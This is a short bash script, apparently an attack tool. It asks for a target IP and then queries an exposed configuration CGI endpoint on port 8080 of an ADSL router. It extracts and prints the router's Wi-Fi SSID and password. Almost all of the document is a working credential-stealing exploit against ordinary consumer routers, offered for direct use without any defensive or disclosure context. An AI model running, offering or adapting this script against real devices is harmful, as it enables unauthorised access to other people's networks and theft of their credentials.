# TERMINAL COLORS
# https://github.com/BlueArduino20/terminal-colors
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"
# END OF TERMINAL COLORS

echo -e -n "$BOLD_GREEN Write the target IP > $BOLD_WHITE "
read IP
if [[ "$(curl --connect-timeout 5 -Is $IP | head -n 1)" == *"HTTP/1.1 200 OK"* ]]; then
	echo ""
	echo -e "${BOLD_CYAN}SSID: $BOLD_WHITE"
	curl -s http://$IP:8080/get_getnetworkconf.cgi | sed -e '4,11 d' | sed -e '1,2 d' | sed -e 's/<BR>//g'
	echo -e "${BOLD_CYAN}PASSWORD: $BOLD_WHITE"
	curl -s http://$IP:8080/get_getnetworkconf.cgi | sed -e '5,11 d' | sed -e '1,3 d' | sed -e 's/<BR>//g'
else
	echo -e "$BOLD_RED Error. Check the IP. ${RED}Make sure that the target ADSL has the 8080 port open."
fi;
